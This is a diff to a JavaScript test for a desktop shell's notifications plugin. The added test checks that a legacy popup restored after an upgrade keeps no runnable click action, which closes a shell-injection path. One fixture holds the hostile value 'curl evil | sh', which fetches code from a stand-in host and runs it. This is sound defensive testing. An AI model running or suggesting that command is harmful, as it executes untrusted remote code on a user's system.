@@ -412,6 +412,19 @@ assertEqual(
   'notifications keep the click argv on history rows'
 )
 
+// Upgrade fail-closed: a popup persisted by a pre-upgrade shell carried its
+// click action as an `exec` shell string. After the update-triggered shell
+// restart the new shell only honors execArgv, so a restored legacy popup keeps
+// displaying but its click is inert — deliberately, because splitting the old
+// shell string back into a command is exactly the injection being removed.
+const legacyRestored = notifications.parsePopupFiles(
+  JSON.stringify({ id: 7, originalId: 7, timestamp: 9, summary: 'Legacy toast', exec: 'curl evil | sh' }),
+  1
+)[0]
+assertEqual(legacyRestored.execArgv || '', '', 'a restored legacy exec shell string is not carried into execArgv')
+assert(!('exec' in legacyRestored), 'a restored legacy popup drops the old exec field')
+assertEqual(notifications.parseExecArgv(legacyRestored.execArgv || ''), null, 'a restored legacy popup has no runnable click action')
+
 const serviceQml = fs.readFileSync(path.join(root, 'shell/plugins/notifications/Service.qml'), 'utf8')
 assert(
   /readonly property int historyLimit: 10/.test(serviceQml),
